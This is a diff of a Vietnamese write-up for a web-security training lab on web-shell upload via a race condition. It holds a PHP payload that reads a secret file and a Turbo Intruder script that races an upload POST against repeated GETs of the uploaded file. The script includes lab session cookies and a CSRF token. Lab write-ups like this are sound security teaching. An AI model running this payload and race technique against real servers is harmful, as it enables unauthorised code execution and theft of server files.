@@ -94,9 +94,13 @@ Sau khi upload, truy cập `/files.avatars/naruto.php`, kết quả trả về n
 ![image](https://user-images.githubusercontent.com/103978452/203678976-af5de655-ed73-404e-a818-fb4515bea3ca.png)
 
 # 6. Web shell upload via race condition
+Website có chứa lỗ hổng race condition. Như vậy có khả năng khi ta submit, server sẽ upload file lên directory đích, sau đó validate xem file có hợp lệ hay không, nếu không hợp lệ sẽ xóa file đi. Để exploit, ta sẽ tiến hành gửi nhiều asynchronous request đến server (cụ thể là 1 request POST chèn file chứa executable code và 5 request GET đến file đã upload), để có thể lấy ra nội dung file trước khi quá trình validation hoàn thành và file bị xóa. 
 
-![image](https://user-images.githubusercontent.com/103978452/203904330-baaa8f18-b26b-48c4-b2f7-af3e92df0bbc.png)
-
+Tạo file `payload.php` với nội dung:
+```
+<?php echo file_get_contents('/home/carlos/secret') ?>`
+```
+Upload `payload.php` lên server rồi bắt request với BurpSuite, sử dụng Turbo Intruder để tiến hành gửi liên tiếp nhiều request. Ta thay đổi cấu hình để tiến hành attack như sau:
 ```
 # Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
 def queueRequests(target, wordlists):
@@ -106,8 +110,8 @@ def queueRequests(target, wordlists):
 
     request1 = ""\
     "POST /my-account/avatar HTTP/1.1\r\n"\
-    "Host: 0a38005f043e0b4fc00810a800d10038.web-security-academy.net\r\n"\
-    "Cookie: session=ySDNtxlS5Wf6y787ddzTzA37th5v6ZJa\r\n"\
+    "Host: 0ad4001c04e199bbc0fe187e005800e2.web-security-academy.net\r\n"\
+    "Cookie: session=XYik7TKj4qhdc4WrpanqSGCM7XRyRSIi\r\n"\
     "Content-Length: 470\r\n"\
     "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCsL5cCjpW6YxOEmG\r\n"\
     "Connection: close\r\n"\
@@ -127,13 +131,13 @@ def queueRequests(target, wordlists):
     "------WebKitFormBoundaryCsL5cCjpW6YxOEmG\r\n"\
     "Content-Disposition: form-data; name=\"csrf\"\r\n"\
     "\r\n"\
-    "QqXQoJAoGQxRfzIRVavqp4OP9zsCom7V\r\n"\
+    "4jKrjI1ZTj4GxVtpvc3IVGHEonQBYYyb\r\n"\
     "------WebKitFormBoundaryCsL5cCjpW6YxOEmG--\r\n\r\n\r"
 
     request2 = ""\
     "GET /files/avatars/payload.php HTTP/1.1\r\n"\
-    "Host: 0a38005f043e0b4fc00810a800d10038.web-security-academy.net\r\n"\
-    "Cookie: session=ySDNtxlS5Wf6y787ddzTzA37th5v6ZJa\r\n"\
+    "Host: 0ad4001c04e199bbc0fe187e005800e2.web-security-academy.net\r\n"\
+    "Cookie: session=XYik7TKj4qhdc4WrpanqSGCM7XRyRSIi\r\n"\
     "Connection: close\r\n\r\n"
 
     engine.queue(request1, gate='race1')
@@ -148,3 +152,8 @@ def queueRequests(target, wordlists):
 def handleResponse(req, interesting):
     table.add(req)
 ```
+Sau khi click "Attack", ta thấy trong số 5 request thì có 3 request có chứa nội dung file /home/carlos/secret
+
+![image](https://user-images.githubusercontent.com/103978452/203930889-5895a577-b620-4195-8ad6-160e3cf85dd0.png)
+
+Sử dụng thông tin thu được để submit, kết quả thành công.
